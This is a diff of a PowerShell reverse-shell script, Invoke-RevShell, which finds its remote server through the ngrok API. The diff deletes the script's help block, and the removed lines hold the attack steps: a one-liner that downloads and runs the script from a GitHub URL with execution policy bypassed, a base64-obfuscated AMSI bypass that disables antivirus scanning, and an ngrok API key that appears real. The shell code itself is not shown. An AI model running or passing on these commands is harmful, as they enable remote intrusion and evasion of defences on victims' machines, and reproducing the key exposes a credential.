@@ -1,32 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;
 
 function Invoke-RevShell {
-    <#
-    .SYNOPSIS
-    Auto detect remote server using ngrok api
-
-    .DESCRIPTION
-    Author: Halit AKAYDIN (hLtAkydn)
-
-    .PARAMETER api
-    Use the api you created with this parameter ( https://dashboard.ngrok.com/api/new )
-    api = 2xFWZHZJfm22lduxMcYEZOlaCJq_6PiWV8N6X1S8GPA9u5w2G
-
-    .EXAMPLE
-    C:\PS> Import-Module .\Invoke-RevShell
-    C:\PS> Invoke-RevShell -api 2xFWZHZJfm22lduxMcYEZOlaCJq_6PiWV8N6X1S8GPA9u5w2G
-    
-    .EXAMPLE
-    powershell -ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
-                                IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/Invoke-RevShell.ps1'); 
-                                Invoke-RevShell -api 2xFWZHZJfm22lduxMcYEZOlaCJq_6PiWV8N6X1S8GPA9u5w2G;"
-
-    .EXAMPLE
-    [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;
-    IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/halitAKAYDIN/Ps-Revshell/main/Invoke-RevShell.ps1'); 
-    Invoke-RevShell -api 2xFWZHZJfm22lduxMcYEZOlaCJq_6PiWV8N6X1S8GPA9u5w2G;
-    #>
 
     param(
         [Parameter(Mandatory=$true)]
